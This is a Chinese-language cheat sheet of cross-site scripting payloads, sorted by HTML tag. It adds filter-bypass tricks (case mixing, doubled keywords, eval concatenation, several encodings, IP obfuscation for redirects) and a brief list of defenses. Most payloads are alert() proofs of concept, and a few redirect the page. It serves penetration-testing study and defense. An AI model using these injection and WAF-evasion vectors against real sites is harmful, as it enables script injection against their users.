
# Web安全中的XSS

## 标签

### xss-demo

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>xss-demo</title>
</head>
<body>
<input onblur=alert("xss") autofocus><input autofocus>
</body>
</html>
```



### \<scirpt>

```html
<script>alert(1)</script>
<script>alert(1);</script>
<script>javascript:alert(1)</script>
```

### \<img>

```html
<img src=x onerror=alert(1)>
```

### \<svg>

```html
<svg/onload=alert(1)>
```



```html
<svg onload=alert%26%230000000040"1")>
```



### \<input>

```html
# 竞争焦点，从而触发onblur事件
<input onblur=alert("xss") autofocus><input autofocus>
# 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<input onfocus="alert('xss');" autofocus>
```



```html
<input onfocus="alert('xss');">
```

```html
<input type="text" value="" onfocus="alert(1)" autofocus="" />
```



```
<input type="text" value='' <div/onmouseover='alert(1)'>X</div>
```



```
<input value=<><iframe/src=javascript:confirm(1)
```





### \<details>

```
<details ontoggle="alert('xss');">
使用open属性触发ontoggle事件，无需用户去触发
<details open ontoggle="alert('xss');">
```

### \<select>

```
<select onfocus=alert(1)></select>
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<select onfocus=alert(1) autofocus>
```

### \<iframe>

```
<iframe onload=alert("xss");></iframe>
```

### \<video>

```
<video><source onerror="alert(1)">
```

### \<audio>

```
<audio src=x  onerror=alert("xss");>
```

### \<body>

```
<body/onload=alert("xss");>
```

利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发

```
<body
onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
```

### \<textarea>

通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发

```html
<textarea onfocus=alert("xss"); autofocus>
```



提前闭合标签

```html
<textarea> </textarea><script>alert("aaa")</script></textarea>
```



```html
<texteara>
<script>
document.addEventListener("DOMContentLoaded", function(event) { 
    alert('aaa');
});
</script>
</texteara>
```



```
<svg/onload=prompt`sec`>
```



### \<keygen>

```
<keygen autofocus onfocus=alert(1)> //仅限火狐
```

### \<marquee>

```
<marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以
```

### \<isindex>

```
<isindex type=image src=1 onerror=alert("xss")>//仅限于IE
```

### \<link>

PS：在无CSP的情况下才可以

```
<link rel=import href="http://127.0.0.1/1.js">
```

### \<a>

```
<a href="javascript:alert(`xss`);">xss</a>
```

### \<form>

```
<form action="Javascript:alert(1)"><input type=submit>
```





## Bypass

#### 过滤空格

用`/`代替空格

```
<img/src="x"/onerror=alert("xss");>
```

#### 过滤关键字

##### 大小写绕过

```
<ImG sRc=x onerRor=alert("xss");>
```

##### 双写关键字

有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过

```
<imimgg srsrcc=x onerror=alert("xss");>
```

##### 字符拼接

利用eval

```
<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
```

利用top

```
<script>top["al"+"ert"](`xss`);</script>
```

##### 其它字符混淆

有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了
下面举几个简单的例子

```
可利用注释、标签的优先级等
1.<<script>alert("xss");//<</script>
2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
3.<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
```

##### 编码绕过

Unicode编码绕过

```
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">

<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">
```

url编码绕过

```
<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
```

```
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
```

Ascii码绕过

```
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
```

hex绕过

```
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
```

八进制

```
<img src=x onerror=alert('\170\163\163')>
```

base64绕过

```
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
```

```
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```

#### 过滤双引号，单引号

1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号

```
<img src="x" onerror=alert(`xss`);>
```

2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了

#### 过滤括号

当括号被过滤的时候可以使用throw来绕过

```
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```

#### 过滤url地址

##### 使用url编码

```
<img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>
```

##### 使用IP

1.十进制IP

```
<img src="x" onerror=document.location=`http://2130706433/`>
```

2.八进制IP

```
<img src="x" onerror=document.location=`http://0177.0.0.01/`>
```

3.hex

```
<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
```

4.html标签中用`//`可以代替`http://`

```
<img src="x" onerror=document.location=`//www.baidu.com`>
```

5.使用`\\`

```
但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议
```


6.使用中文逗号代替英文逗号
如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号

```
<img src="x" onerror="document.location=`http://www。baidu。com`">//会自动跳转到百度
```

## 防御

- 过滤一些危险字符，以及转义`& < > " ' /`等危险字符
- HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。
- 设置CSP(Content Security Policy)
- 输入内容长度限制






参考：

https://xz.aliyun.com/t/4067

